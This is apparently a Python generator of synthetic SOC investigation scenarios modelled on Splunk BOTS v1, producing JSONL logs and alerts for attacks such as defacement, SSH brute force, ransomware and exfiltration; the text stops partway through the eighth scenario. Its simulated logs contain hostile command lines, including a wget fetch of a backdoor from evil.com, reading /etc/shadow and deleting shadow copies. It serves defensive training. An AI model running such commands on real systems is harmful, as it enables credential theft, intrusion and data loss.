#!/usr/bin/env python3
"""Générateur de scénarios d'investigation SOC.

Crée 8 scénarios réalistes basés sur les attaques documentées de Splunk BOTS v1
(Wayne Enterprises / imreallynotbatman.com). Chaque scénario produit :
  - Un fichier JSONL de logs normalisés (firewall, auth, endpoint, IDS)
  - Une alerte brute correspondante

POURQUOI synthétique : Le dataset BOTS v1 attack-only est au format interne Splunk
(nécessite une instance Splunk pour l'ingestion). La version JSON fait ~120 Go.
Ces logs synthétiques reproduisent fidèlement les patterns d'attaque documentés
dans les walkthroughs BOTS v1, avec les mêmes IPs, hostnames, et signatures.

Limites vs production :
  - Pas de bruit de fond (trafic bénin entre les signaux)
  - Événements condensés temporellement (minutes vs heures en réalité)
  - Nombre d'événements réduit (dizaines vs milliers)
"""

from __future__ import annotations

import json
import sys
from datetime import datetime, timedelta
from pathlib import Path
from uuid import uuid4

# Ajout du path parent pour les imports
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.models.alert import Alert, AlertStatus, LogEvent, LogSourceType


# ──────────────── Helpers ────────────────


def _ts(base: datetime, minutes: int = 0, seconds: int = 0) -> datetime:
    """Offset un timestamp de base."""
    return base + timedelta(minutes=minutes, seconds=seconds)


def _event(
    timestamp: datetime,
    source_type: LogSourceType,
    scenario_id: str,
    *,
    src_ip: str = "",
    dest_ip: str = "",
    src_port: int | None = None,
    dest_port: int | None = None,
    user: str = "",
    host: str = "",
    action: str = "",
    raw_event: str = "",
    metadata: dict | None = None,
) -> dict:
    """Construit un événement sérialisable en JSONL."""
    evt = LogEvent(
        id=uuid4(),
        timestamp=timestamp,
        source_type=source_type,
        src_ip=src_ip,
        dest_ip=dest_ip,
        src_port=src_port,
        dest_port=dest_port,
        user=user,
        host=host,
        action=action,
        raw_event=raw_event,
        metadata=metadata or {},
        scenario_id=scenario_id,
    )
    return json.loads(evt.model_dump_json())


# ──────────────── Scénario 1 : Web Defacement ────────────────
# Basé sur BOTS v1 — po1s0n1vy scanne imreallynotbatman.com avec Acunetix,
# exploite une vulnérabilité web, upload un webshell, défigure le site.


def generate_scenario_01_web_defacement() -> tuple[list[dict], dict]:
    sid = "scenario_01_web_defacement"
    base = datetime(2024, 8, 10, 14, 20, 0)
    attacker_ip = "23.22.63.114"
    target_ip = "192.168.250.70"
    target_host = "imreallynotbatman.com"

    events = [
        # Phase 1 : Reconnaissance — Acunetix scanning
        _event(
            _ts(base, 0, 0), LogSourceType.FIREWALL, sid,
            src_ip=attacker_ip, dest_ip=target_ip, src_port=49152, dest_port=80,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={attacker_ip} dstip={target_ip} dstport=80 proto=tcp",
            metadata={"protocol": "tcp", "bytes_sent": 1240, "bytes_received": 5800, "session_duration": 2},
        ),
        _event(
            _ts(base, 0, 1), LogSourceType.IDS, sid,
            src_ip=attacker_ip, dest_ip=target_ip, src_port=49152, dest_port=80,
            action="alert", host="ids-01",
            raw_event=f"[**] ET SCAN Acunetix Web Vulnerability Scanner [**] {attacker_ip}:49152 -> {target_ip}:80",
            metadata={"signature": "ET SCAN Acunetix Web Vulnerability Scanner", "severity": 2, "category": "web-scan"},
        ),
        _event(
            _ts(base, 0, 5), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="GET", host=target_host,
            raw_event=f'{attacker_ip} - - "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix"',
            metadata={"http_method": "GET", "uri": "/", "status_code": 200, "user_agent": "Acunetix Web Vulnerability Scanner"},
        ),
        # Scanning multiple paths
        _event(
            _ts(base, 0, 8), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="GET", host=target_host,
            raw_event=f'{attacker_ip} - - "GET /joomla/administrator/ HTTP/1.1" 200 8421',
            metadata={"http_method": "GET", "uri": "/joomla/administrator/", "status_code": 200, "user_agent": "Acunetix"},
        ),
        _event(
            _ts(base, 0, 12), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="GET", host=target_host,
            raw_event=f'{attacker_ip} - - "GET /joomla/administrator/index.php HTTP/1.1" 200 7654',
            metadata={"http_method": "GET", "uri": "/joomla/administrator/index.php", "status_code": 200},
        ),

        # Phase 2 : Brute force sur le panel admin Joomla
        _event(
            _ts(base, 1, 0), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php HTTP/1.1" 303 0',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php", "status_code": 303,
                       "form_data": "username=admin&passwd=password123&task=login"},
        ),
        _event(
            _ts(base, 1, 3), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php HTTP/1.1" 303 0',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php", "status_code": 303,
                       "form_data": "username=admin&passwd=admin&task=login"},
        ),
        _event(
            _ts(base, 1, 6), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php HTTP/1.1" 303 0',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php", "status_code": 303,
                       "form_data": "username=admin&passwd=batman&task=login"},
        ),
        # Login réussi
        _event(
            _ts(base, 1, 9), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php HTTP/1.1" 200 12456',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php", "status_code": 200,
                       "form_data": "username=admin&passwd=batman&task=login"},
        ),
        _event(
            _ts(base, 1, 10), LogSourceType.IDS, sid,
            src_ip=attacker_ip, dest_ip=target_ip, src_port=49210, dest_port=80,
            action="alert", host="ids-01",
            raw_event=f"[**] ET WEB_SERVER Possible SQL Injection Attempt [**] {attacker_ip} -> {target_ip}",
            metadata={"signature": "ET WEB_SERVER Possible SQL Injection Attempt", "severity": 1, "category": "web-attack"},
        ),

        # Phase 3 : Upload webshell
        _event(
            _ts(base, 2, 0), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php?option=com_templates&task=template.apply HTTP/1.1" 200 0',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php?option=com_templates",
                       "status_code": 200, "content_type": "multipart/form-data"},
        ),
        _event(
            _ts(base, 2, 5), LogSourceType.ENDPOINT, sid,
            src_ip=target_ip, host=target_host,
            action="process_create",
            raw_event="Process Create: cmd.exe /c whoami, Parent: w3wp.exe, User: IUSR",
            metadata={"process_name": "cmd.exe", "command_line": "cmd.exe /c whoami",
                       "parent_process": "w3wp.exe", "user": "IUSR", "event_id": 1},
        ),

        # Phase 4 : Defacement
        _event(
            _ts(base, 3, 0), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /joomla/administrator/index.php?option=com_templates&task=template.apply HTTP/1.1" 200 0',
            metadata={"http_method": "POST", "uri": "/joomla/administrator/index.php?option=com_templates",
                       "status_code": 200},
        ),
        _event(
            _ts(base, 3, 30), LogSourceType.IDS, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=80,
            action="alert", host="ids-01",
            raw_event=f"[**] ET WEB_SERVER Web Shell Upload Attempt [**] {attacker_ip} -> {target_ip}",
            metadata={"signature": "ET WEB_SERVER Web Shell Upload Attempt", "severity": 1, "category": "web-attack"},
        ),
    ]

    alert = Alert(
        id="ALT-2024-001",
        timestamp=_ts(base, 0, 1),
        source="Suricata IDS",
        title="Web Vulnerability Scanner Detected — imreallynotbatman.com",
        description=(
            f"Suricata alerted on traffic matching 'ET SCAN Acunetix Web Vulnerability Scanner' "
            f"from {attacker_ip} targeting {target_ip} (imreallynotbatman.com) on port 80. "
            f"Multiple HTTP requests observed in rapid succession."
        ),
        raw_data={
            "src_ip": attacker_ip,
            "dest_ip": target_ip,
            "dest_port": 80,
            "signature": "ET SCAN Acunetix Web Vulnerability Scanner",
            "severity": 2,
            "timestamp": base.isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 2 : Brute Force SSH ────────────────


def generate_scenario_02_brute_force() -> tuple[list[dict], dict]:
    sid = "scenario_02_brute_force"
    base = datetime(2024, 8, 11, 3, 15, 0)
    attacker_ip = "40.80.148.42"
    target_ip = "192.168.250.50"
    target_host = "srv-dc01"

    events = []

    # 15 tentatives de login échouées en 3 minutes
    for i in range(15):
        events.append(_event(
            _ts(base, 0, i * 12), LogSourceType.AUTH, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=22,
            user=f"admin" if i % 3 == 0 else f"root" if i % 3 == 1 else "administrator",
            host=target_host, action="login_failed",
            raw_event=f"sshd[{2100+i}]: Failed password for {'admin' if i%3==0 else 'root' if i%3==1 else 'administrator'} from {attacker_ip} port {50000+i} ssh2",
            metadata={"event_id": 4625, "logon_type": 10, "failure_reason": "bad_password",
                       "service": "sshd"},
        ))
        events.append(_event(
            _ts(base, 0, i * 12), LogSourceType.FIREWALL, sid,
            src_ip=attacker_ip, dest_ip=target_ip, src_port=50000 + i, dest_port=22,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={attacker_ip} dstip={target_ip} dstport=22 proto=tcp",
            metadata={"protocol": "tcp", "bytes_sent": 380, "bytes_received": 120},
        ))

    # Login réussi après brute force
    events.append(_event(
        _ts(base, 3, 5), LogSourceType.AUTH, sid,
        src_ip=attacker_ip, dest_ip=target_ip, dest_port=22,
        user="admin", host=target_host, action="login_success",
        raw_event=f"sshd[2120]: Accepted password for admin from {attacker_ip} port 50020 ssh2",
        metadata={"event_id": 4624, "logon_type": 10, "service": "sshd"},
    ))

    # Activité post-compromission
    events.append(_event(
        _ts(base, 3, 30), LogSourceType.ENDPOINT, sid,
        host=target_host, user="admin",
        action="process_create",
        raw_event="Process Create: /bin/bash -c 'cat /etc/shadow', Parent: sshd, User: admin",
        metadata={"process_name": "/bin/bash", "command_line": "cat /etc/shadow",
                   "parent_process": "sshd", "event_id": 1},
    ))
    events.append(_event(
        _ts(base, 4, 0), LogSourceType.ENDPOINT, sid,
        host=target_host, user="admin",
        action="process_create",
        raw_event="Process Create: /usr/bin/wget http://evil.com/backdoor.sh, Parent: bash, User: admin",
        metadata={"process_name": "wget", "command_line": "wget http://evil.com/backdoor.sh",
                   "parent_process": "bash", "event_id": 1},
    ))

    alert = Alert(
        id="ALT-2024-002",
        timestamp=_ts(base, 1, 0),
        source="Windows Event Log",
        title="Multiple Failed Login Attempts — srv-dc01",
        description=(
            f"15 failed SSH login attempts detected from {attacker_ip} targeting {target_host} "
            f"({target_ip}) within 3 minutes. Multiple usernames attempted: admin, root, administrator. "
            f"Pattern consistent with brute force attack."
        ),
        raw_data={
            "src_ip": attacker_ip,
            "dest_ip": target_ip,
            "dest_port": 22,
            "event_id": 4625,
            "failure_count": 15,
            "time_window_seconds": 180,
            "timestamp": base.isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 3 : Ransomware (Cerber via USB) ────────────────


def generate_scenario_03_ransomware() -> tuple[list[dict], dict]:
    sid = "scenario_03_ransomware"
    base = datetime(2024, 8, 12, 9, 45, 0)
    victim_host = "ws-bobsmith"
    victim_ip = "192.168.250.100"
    c2_ip = "185.141.27.88"
    user = "WAYNE\\bob.smith"

    events = [
        # USB insertion détectée
        _event(
            _ts(base, 0, 0), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="usb_insert",
            raw_event=f"USB Mass Storage Device inserted, Drive: E:, Serial: 4C530001, User: {user}",
            metadata={"event_id": 6416, "device_type": "USB Mass Storage",
                       "drive_letter": "E:", "device_serial": "4C530001"},
        ),
        # Exécution du payload
        _event(
            _ts(base, 0, 45), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="process_create",
            raw_event=f"Process Create: E:\\invoice_aug2024.exe, Parent: explorer.exe, User: {user}",
            metadata={"process_name": "invoice_aug2024.exe", "command_line": "E:\\invoice_aug2024.exe",
                       "parent_process": "explorer.exe", "event_id": 1,
                       "file_hash_sha256": "d41d8cd98f00b204e9800998ecf8427e2b3f68c1a8e5d7c933b9f4e2460b13d6"},
        ),
        # Processus enfant suspect
        _event(
            _ts(base, 1, 0), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="process_create",
            raw_event=f"Process Create: cmd.exe /c vssadmin delete shadows /all /quiet, Parent: invoice_aug2024.exe, User: {user}",
            metadata={"process_name": "cmd.exe",
                       "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
                       "parent_process": "invoice_aug2024.exe", "event_id": 1},
        ),
        _event(
            _ts(base, 1, 5), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="process_create",
            raw_event=f"Process Create: vssadmin.exe delete shadows /all /quiet, Parent: cmd.exe",
            metadata={"process_name": "vssadmin.exe",
                       "command_line": "vssadmin delete shadows /all /quiet",
                       "parent_process": "cmd.exe", "event_id": 1},
        ),
        # Connexion C2
        _event(
            _ts(base, 1, 15), LogSourceType.FIREWALL, sid,
            src_ip=victim_ip, dest_ip=c2_ip, src_port=52341, dest_port=443,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={victim_ip} dstip={c2_ip} dstport=443 proto=tcp bytes_sent=2840",
            metadata={"protocol": "tcp", "bytes_sent": 2840, "bytes_received": 1200},
        ),
        _event(
            _ts(base, 1, 20), LogSourceType.IDS, sid,
            src_ip=victim_ip, dest_ip=c2_ip, src_port=52341, dest_port=443,
            action="alert", host="ids-01",
            raw_event=f"[**] ET MALWARE Cerber Ransomware CnC Beacon [**] {victim_ip} -> {c2_ip}",
            metadata={"signature": "ET MALWARE Cerber Ransomware CnC Beacon",
                       "severity": 1, "category": "malware-cnc"},
        ),
        # Encryption des fichiers
        _event(
            _ts(base, 2, 0), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="file_modify",
            raw_event=f"Multiple file modifications detected: 247 files renamed to .cerber extension in C:\\Users\\bob.smith\\Documents\\",
            metadata={"event_id": 11, "files_affected": 247,
                       "extension_added": ".cerber", "target_dir": "C:\\Users\\bob.smith\\Documents\\"},
        ),
        # Ransom note
        _event(
            _ts(base, 2, 30), LogSourceType.ENDPOINT, sid,
            host=victim_host, user=user,
            action="file_create",
            raw_event="File Create: C:\\Users\\bob.smith\\Desktop\\_README_.hta, Process: invoice_aug2024.exe",
            metadata={"event_id": 11, "file_name": "_README_.hta",
                       "file_path": "C:\\Users\\bob.smith\\Desktop\\_README_.hta"},
        ),
    ]

    alert = Alert(
        id="ALT-2024-003",
        timestamp=_ts(base, 1, 20),
        source="Suricata IDS",
        title="Cerber Ransomware C2 Communication Detected — ws-bobsmith",
        description=(
            f"Suricata detected outbound traffic matching 'ET MALWARE Cerber Ransomware CnC Beacon' "
            f"from {victim_ip} ({victim_host}) to external IP {c2_ip} on port 443. "
            f"User {user} was logged in at the time of the alert."
        ),
        raw_data={
            "src_ip": victim_ip,
            "dest_ip": c2_ip,
            "dest_port": 443,
            "signature": "ET MALWARE Cerber Ransomware CnC Beacon",
            "severity": 1,
            "host": victim_host,
            "user": user,
            "timestamp": _ts(base, 1, 20).isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 4 : Data Exfiltration ────────────────


def generate_scenario_04_data_exfiltration() -> tuple[list[dict], dict]:
    sid = "scenario_04_data_exfiltration"
    base = datetime(2024, 8, 13, 22, 30, 0)
    insider_ip = "192.168.250.120"
    insider_host = "ws-jdoe"
    exfil_ip = "91.234.99.42"
    user = "WAYNE\\j.doe"

    events = [
        # Accès hors heures
        _event(
            _ts(base, 0, 0), LogSourceType.AUTH, sid,
            src_ip=insider_ip, user=user, host=insider_host,
            action="login_success",
            raw_event=f"An account was successfully logged on. User: {user}, Workstation: {insider_host}, LogonType: 2",
            metadata={"event_id": 4624, "logon_type": 2},
        ),
        # Accès à des fichiers sensibles
        _event(
            _ts(base, 5, 0), LogSourceType.ENDPOINT, sid,
            host=insider_host, user=user,
            action="file_access",
            raw_event=f"File access: \\\\fileserver\\finance\\Q3_2024_financials.xlsx, User: {user}, Access: Read",
            metadata={"event_id": 4663, "file_path": "\\\\fileserver\\finance\\Q3_2024_financials.xlsx",
                       "access_type": "read"},
        ),
        _event(
            _ts(base, 6, 0), LogSourceType.ENDPOINT, sid,
            host=insider_host, user=user,
            action="file_access",
            raw_event=f"File access: \\\\fileserver\\hr\\employee_salaries_2024.csv, User: {user}, Access: Read",
            metadata={"event_id": 4663, "file_path": "\\\\fileserver\\hr\\employee_salaries_2024.csv",
                       "access_type": "read"},
        ),
        # Compression des données
        _event(
            _ts(base, 8, 0), LogSourceType.ENDPOINT, sid,
            host=insider_host, user=user,
            action="process_create",
            raw_event=f"Process Create: 7z.exe a C:\\Temp\\backup.7z \\\\fileserver\\finance\\ \\\\fileserver\\hr\\, User: {user}",
            metadata={"process_name": "7z.exe",
                       "command_line": "7z.exe a C:\\Temp\\backup.7z \\\\fileserver\\finance\\ \\\\fileserver\\hr\\",
                       "parent_process": "cmd.exe", "event_id": 1},
        ),
        # Upload vers un serveur externe
        _event(
            _ts(base, 12, 0), LogSourceType.FIREWALL, sid,
            src_ip=insider_ip, dest_ip=exfil_ip, src_port=54123, dest_port=443,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={insider_ip} dstip={exfil_ip} dstport=443 bytes_sent=48500000",
            metadata={"protocol": "tcp", "bytes_sent": 48_500_000, "bytes_received": 12000,
                       "session_duration": 180},
        ),
        _event(
            _ts(base, 12, 0), LogSourceType.IDS, sid,
            src_ip=insider_ip, dest_ip=exfil_ip, src_port=54123, dest_port=443,
            action="alert", host="ids-01",
            raw_event=f"[**] ET POLICY Outbound Large File Transfer [**] {insider_ip} -> {exfil_ip}",
            metadata={"signature": "ET POLICY Outbound Large File Transfer",
                       "severity": 2, "category": "policy-violation",
                       "bytes_transferred": 48_500_000},
        ),
        # DNS pour le domaine d'exfiltration
        _event(
            _ts(base, 11, 50), LogSourceType.DNS, sid,
            src_ip=insider_ip, dest_ip="192.168.250.10",
            host=insider_host, action="dns_query",
            raw_event=f"DNS query: dropzone-files.xyz -> {exfil_ip}, Type: A, Client: {insider_ip}",
            metadata={"query": "dropzone-files.xyz", "query_type": "A",
                       "answer": exfil_ip},
        ),
    ]

    alert = Alert(
        id="ALT-2024-004",
        timestamp=_ts(base, 12, 0),
        source="Fortinet Firewall",
        title="Large Outbound Data Transfer — ws-jdoe to External IP",
        description=(
            f"Firewall detected an unusually large outbound transfer (~48.5 MB) from "
            f"{insider_ip} ({insider_host}) to external IP {exfil_ip} on port 443. "
            f"Transfer occurred at 22:42 (after business hours). User {user} was logged in."
        ),
        raw_data={
            "src_ip": insider_ip,
            "dest_ip": exfil_ip,
            "dest_port": 443,
            "bytes_sent": 48_500_000,
            "host": insider_host,
            "user": user,
            "timestamp": _ts(base, 12, 0).isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 5 : Reconnaissance / Port Scan ────────────────


def generate_scenario_05_reconnaissance() -> tuple[list[dict], dict]:
    sid = "scenario_05_reconnaissance"
    base = datetime(2024, 8, 14, 11, 0, 0)
    scanner_ip = "10.0.0.88"
    targets = ["192.168.250.50", "192.168.250.70", "192.168.250.100", "192.168.250.120"]
    ports = [22, 80, 443, 445, 3389, 8080, 8443]

    events = []
    second_offset = 0

    # Scan de ports sur plusieurs machines
    for target_ip in targets:
        for port in ports:
            events.append(_event(
                _ts(base, 0, second_offset), LogSourceType.FIREWALL, sid,
                src_ip=scanner_ip, dest_ip=target_ip, src_port=40000 + second_offset, dest_port=port,
                action="deny" if port in [3389, 8443] else "allow",
                host="fw-01",
                raw_event=f"id=firewall action={'deny' if port in [3389, 8443] else 'allow'} srcip={scanner_ip} dstip={target_ip} dstport={port}",
                metadata={"protocol": "tcp", "bytes_sent": 60, "bytes_received": 0 if port in [3389, 8443] else 44},
            ))
            second_offset += 1

    # Alerte IDS
    events.append(_event(
        _ts(base, 0, 30), LogSourceType.IDS, sid,
        src_ip=scanner_ip, dest_ip="192.168.250.0/24",
        action="alert", host="ids-01",
        raw_event=f"[**] ET SCAN Nmap Scripting Engine User-Agent Detected [**] {scanner_ip}",
        metadata={"signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",
                   "severity": 2, "category": "network-scan",
                   "unique_destinations": len(targets), "unique_ports": len(ports)},
    ))

    alert = Alert(
        id="ALT-2024-005",
        timestamp=_ts(base, 0, 30),
        source="Suricata IDS",
        title="Internal Network Port Scan Detected — 10.0.0.88",
        description=(
            f"Suricata detected Nmap scanning activity from internal IP {scanner_ip}. "
            f"Connections observed to {len(targets)} hosts across {len(ports)} ports "
            f"within a 30-second window. Source is an internal workstation."
        ),
        raw_data={
            "src_ip": scanner_ip,
            "dest_network": "192.168.250.0/24",
            "signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",
            "unique_destinations": len(targets),
            "unique_ports": len(ports),
            "timestamp": base.isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 6 : Faux Positif (Admin légitime) ────────────────


def generate_scenario_06_false_positive() -> tuple[list[dict], dict]:
    sid = "scenario_06_false_positive"
    base = datetime(2024, 8, 15, 10, 0, 0)
    admin_ip = "192.168.250.10"
    admin_host = "ws-sysadmin01"
    server_ip = "192.168.250.50"
    server_host = "srv-dc01"
    user = "WAYNE\\sysadmin.jones"

    events = [
        # Login admin normal (pendant heures de travail)
        _event(
            _ts(base, 0, 0), LogSourceType.AUTH, sid,
            src_ip=admin_ip, dest_ip=server_ip, user=user, host=server_host,
            action="login_success",
            raw_event=f"An account was successfully logged on. User: {user}, Workstation: {admin_host}, LogonType: 3",
            metadata={"event_id": 4624, "logon_type": 3, "logon_process": "Kerberos"},
        ),
        # PowerShell — tâche de maintenance de routine
        _event(
            _ts(base, 2, 0), LogSourceType.ENDPOINT, sid,
            host=server_host, user=user,
            action="process_create",
            raw_event=f"Process Create: powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Update-ADGroupPolicy.ps1, User: {user}",
            metadata={"process_name": "powershell.exe",
                       "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Update-ADGroupPolicy.ps1",
                       "parent_process": "services.exe", "event_id": 1},
        ),
        # Plusieurs connexions réseau (DC vers réseau local)
        _event(
            _ts(base, 3, 0), LogSourceType.FIREWALL, sid,
            src_ip=server_ip, dest_ip="192.168.250.255", src_port=389, dest_port=389,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={server_ip} dstip=192.168.250.255 dstport=389 proto=tcp",
            metadata={"protocol": "tcp", "bytes_sent": 4500, "bytes_received": 3200,
                       "service": "LDAP"},
        ),
        # Event log Task Scheduler
        _event(
            _ts(base, 0, -60), LogSourceType.ENDPOINT, sid,
            host=server_host, user="SYSTEM",
            action="scheduled_task",
            raw_event="Task Scheduler: Task 'Weekly-AD-Maintenance' started, User: SYSTEM",
            metadata={"event_id": 106, "task_name": "Weekly-AD-Maintenance",
                       "user_name": user},
        ),
    ]

    alert = Alert(
        id="ALT-2024-006",
        timestamp=_ts(base, 2, 0),
        source="Sysmon",
        title="Suspicious PowerShell Execution — srv-dc01",
        description=(
            f"Sysmon detected PowerShell execution with '-ExecutionPolicy Bypass' on {server_host} "
            f"({server_ip}). Process launched by {user}. ExecutionPolicy Bypass is commonly used "
            f"by attackers to evade script controls."
        ),
        raw_data={
            "host": server_host,
            "user": user,
            "process": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Update-ADGroupPolicy.ps1",
            "parent_process": "services.exe",
            "event_id": 1,
            "timestamp": _ts(base, 2, 0).isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 7 : Mouvement Latéral Ambigu ────────────────


def generate_scenario_07_ambiguous_lateral() -> tuple[list[dict], dict]:
    sid = "scenario_07_ambiguous_lateral"
    base = datetime(2024, 8, 16, 15, 30, 0)
    source_ip = "192.168.250.100"
    source_host = "ws-bobsmith"
    target1_ip = "192.168.250.50"
    target1_host = "srv-dc01"
    target2_ip = "192.168.250.60"
    target2_host = "srv-fileserver"
    user = "WAYNE\\bob.smith"

    events = [
        # Login sur la station de travail
        _event(
            _ts(base, 0, 0), LogSourceType.AUTH, sid,
            src_ip=source_ip, user=user, host=source_host,
            action="login_success",
            raw_event=f"An account was successfully logged on. User: {user}, LogonType: 2",
            metadata={"event_id": 4624, "logon_type": 2},
        ),
        # PsExec vers le DC — potentiellement légitime ou compromis
        _event(
            _ts(base, 5, 0), LogSourceType.ENDPOINT, sid,
            host=source_host, user=user,
            action="process_create",
            raw_event=f"Process Create: PsExec.exe \\\\{target1_host} cmd.exe, User: {user}",
            metadata={"process_name": "PsExec.exe",
                       "command_line": f"PsExec.exe \\\\{target1_host} cmd.exe",
                       "parent_process": "explorer.exe", "event_id": 1},
        ),
        _event(
            _ts(base, 5, 5), LogSourceType.AUTH, sid,
            src_ip=source_ip, dest_ip=target1_ip, user=user, host=target1_host,
            action="login_success",
            raw_event=f"Network logon: User {user} from {source_ip}, LogonType: 3",
            metadata={"event_id": 4624, "logon_type": 3, "logon_process": "NtLmSsp"},
        ),
        _event(
            _ts(base, 5, 10), LogSourceType.FIREWALL, sid,
            src_ip=source_ip, dest_ip=target1_ip, src_port=52000, dest_port=445,
            action="allow", host="fw-01",
            raw_event=f"id=firewall action=allow srcip={source_ip} dstip={target1_ip} dstport=445 proto=tcp",
            metadata={"protocol": "tcp", "bytes_sent": 15000, "bytes_received": 8000,
                       "service": "SMB"},
        ),
        # Exécution de commandes sur le DC
        _event(
            _ts(base, 6, 0), LogSourceType.ENDPOINT, sid,
            host=target1_host, user=user,
            action="process_create",
            raw_event=f"Process Create: cmd.exe /c net user /domain, Parent: PSEXESVC.exe, User: {user}",
            metadata={"process_name": "cmd.exe", "command_line": "net user /domain",
                       "parent_process": "PSEXESVC.exe", "event_id": 1},
        ),
        # Mouvement vers le file server
        _event(
            _ts(base, 8, 0), LogSourceType.AUTH, sid,
            src_ip=source_ip, dest_ip=target2_ip, user=user, host=target2_host,
            action="login_success",
            raw_event=f"Network logon: User {user} from {source_ip}, LogonType: 3",
            metadata={"event_id": 4624, "logon_type": 3},
        ),
        _event(
            _ts(base, 8, 30), LogSourceType.ENDPOINT, sid,
            host=target2_host, user=user,
            action="file_access",
            raw_event=f"Bulk file access: 43 files accessed in \\\\{target2_host}\\sensitive-projects\\, User: {user}",
            metadata={"event_id": 4663, "files_accessed": 43,
                       "share_path": f"\\\\{target2_host}\\sensitive-projects\\",
                       "access_type": "read"},
        ),
    ]

    alert = Alert(
        id="ALT-2024-007",
        timestamp=_ts(base, 5, 0),
        source="Sysmon",
        title="PsExec Remote Execution Detected — ws-bobsmith → srv-dc01",
        description=(
            f"Sysmon detected PsExec execution from {source_host} ({source_ip}) targeting "
            f"{target1_host} ({target1_ip}). PsExec is a legitimate admin tool but is also "
            f"commonly used for lateral movement. User {user} initiated the connection."
        ),
        raw_data={
            "src_ip": source_ip,
            "dest_ip": target1_ip,
            "host": source_host,
            "user": user,
            "process": "PsExec.exe",
            "command_line": f"PsExec.exe \\\\{target1_host} cmd.exe",
            "timestamp": _ts(base, 5, 0).isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Scénario 8 : Credential Stuffing ────────────────


def generate_scenario_08_credential_stuffing() -> tuple[list[dict], dict]:
    sid = "scenario_08_credential_stuffing"
    base = datetime(2024, 8, 17, 7, 0, 0)
    attacker_ip = "198.71.247.91"
    target_ip = "192.168.250.70"
    target_host = "webmail.wayne-enterprises.com"
    users = [
        "bruce.wayne", "lucius.fox", "alfred.pennyworth", "selina.kyle",
        "harvey.dent", "jim.gordon", "barbara.gordon", "dick.grayson",
        "tim.drake", "jason.todd", "damian.wayne", "kate.kane",
    ]

    events = []

    # Tentatives de login avec des credentials volés (1 par user, différents passwords)
    for i, username in enumerate(users):
        events.append(_event(
            _ts(base, 0, i * 5), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=443,
            action="POST", host=target_host,
            raw_event=f'{attacker_ip} - - "POST /owa/auth.owa HTTP/1.1" 401 0',
            metadata={"http_method": "POST", "uri": "/owa/auth.owa", "status_code": 401,
                       "form_data": f"username={username}&password=leaked_pass_{i}"},
        ))
        events.append(_event(
            _ts(base, 0, i * 5), LogSourceType.AUTH, sid,
            src_ip=attacker_ip, dest_ip=target_ip,
            user=f"WAYNE\\{username}", host=target_host,
            action="login_failed",
